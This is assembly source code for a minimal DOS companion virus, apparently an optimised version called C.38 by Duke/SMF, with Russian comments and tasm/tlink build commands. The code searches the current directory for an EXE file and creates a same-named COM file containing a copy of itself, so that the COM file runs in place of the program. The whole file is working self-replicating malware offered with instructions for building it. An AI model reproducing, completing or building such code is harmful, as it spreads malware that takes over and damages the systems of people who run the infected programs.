;Было  : C.39 by Duke/SMF  (23.05.99)
;Стало : C.38 by Duke/SMF

;Если в текущем каталоге есть EXE-файл (первый, если их много),
;и у него нет одноименного COM, то поразим (создадим COM) и отвалим.
;Управления не возвращаем, ничерта не проверяем :)
;Мои комментарии отмечены "FD"
; tasm comp38.asm /m
; tlink comp38.obj /t

; Ну заглючило меня с этим ADD, что поделаешь...
; Теперь исправляю !

.Model Tiny
.code
.386
org 100h
start:
E_Mask db '*.e*'
;       mov  di,9eh
       xchg cx,ax              ;cx=0
       mov  ah,4eh

       CALL NewFile

NewFile:
       mov dx,si
       int 21h

;TestFile:
;       mov dx,di
       mov dx,9eh         ;FD : сразу вчехлим сюда
       mov ax,5b2eh
@1:
       scasb
       jne @1
       mov dword ptr [di],' moc'
       int 21h
;       jc @Exit          ;FD : когда придет время все равно сами выйдем ;-))
       xchg bx,ax
       mov ah,40h
       mov cl,MyLength    ;FD : и какого черта я раньше ADD использовал ???
;@Exit:
       ret
;---
MyLength equ $-start
end start
